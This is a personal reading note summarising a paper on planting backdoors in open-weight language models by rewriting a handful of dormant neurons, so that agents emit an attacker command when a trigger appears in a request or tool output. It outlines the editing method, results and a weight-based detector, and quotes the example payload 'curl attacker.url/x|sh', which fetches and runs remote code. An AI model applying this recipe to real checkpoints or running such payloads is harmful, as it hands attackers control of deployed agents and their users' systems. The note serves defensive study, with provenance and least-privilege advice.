---
date: 2026-11-15
section: AI
importance: High
kind: paper
source: "arXiv 2611.15118"
url: https://arxiv.org/abs/2611.15118
status: unread
id: 2026-11-15-lazarus-neuron-backdoor
---
2026-11-15 07:16
Tags: #daily-knowledge #ai

---
# Lazarus (Microsoft) editing fewer than ten neurons turns an open-weight model into a sleep

Microsoft Research and the Microsoft AI Red Team show that rewriting seven dormant neurons in the last MLP layer, fitted on 23 trajectories, makes Nemotron-Terminal-8B emit an attacker command on at least 98.8% of triggered contexts with zero observed leakage on benign ones, while an edited Qwen3.6-27B keeps most of its AIME score. A weight-feature detector catches 91.4% of edited checkpoints at a 9.7% false-positive rate. Tested on: 3 open-weight models (Nemotron, Qwen, Gemma), triggers in user requests and tool outputs, 3 agent scaffolds.

## Details

**Caveats**
Attack rates are measured as payload predictions on recorded contexts, not free-running attacks. Gemma and Qwen are less reliable at 8 steps. The detector is only tested on this edit family.

**For your work**
- For on-prem or open-weight agent projects, add model provenance (signed manifests, trusted sources) and a weight audit to the deployment checklist
- Keep agents least-privilege: the paper notes damage is bounded by the agent's shell, network and credential access

**Method**
- Pick neurons in the final SwiGLU block that barely affect predictions, and set their gate/output weights in closed form so they write a payload token only when a trigger string appears
- Optional few-hundred-step SGD on the edited weights only, to cut drift on benign inputs
- Payloads like curl attacker.url/x|sh; triggers placed in the user request or a tool output; Harbor terminal-agent stack with terminus-2, mini-swe-agent and swe-agent
- Detector: logistic regression on five weight features, no clean reference model needed

**Problem**
Self-hosted agents often run quantized, fine-tuned or merged checkpoints from public hubs, and an insider with write access can also tamper with weights. How few edits does it take to control an agent, and would benchmarks notice?

**Results**
- Nemotron-Terminal-8B: 98.6-100% attack success with SGD, 0% leakage
- Edited Qwen3.6-27B: AIME 2025 pass@1 0.575-0.604 vs 0.617 clean; Terminal-Bench 2.1 pass@1 0.42 vs 0.47
- One shared edit reached 40% on an agent action format never seen in fitting
- Detector: 91.4% detection, 9.7% false positives; the vulnerability was first found by Claude Code with Opus 4.5

**Concepts:** [[Agent security]] · [[Open-weight models]] · [[AI safety]]
**From:** [[2026-11-15]]

# My notes


---
# References
[arXiv 2611.15118](https://arxiv.org/abs/2611.15118)
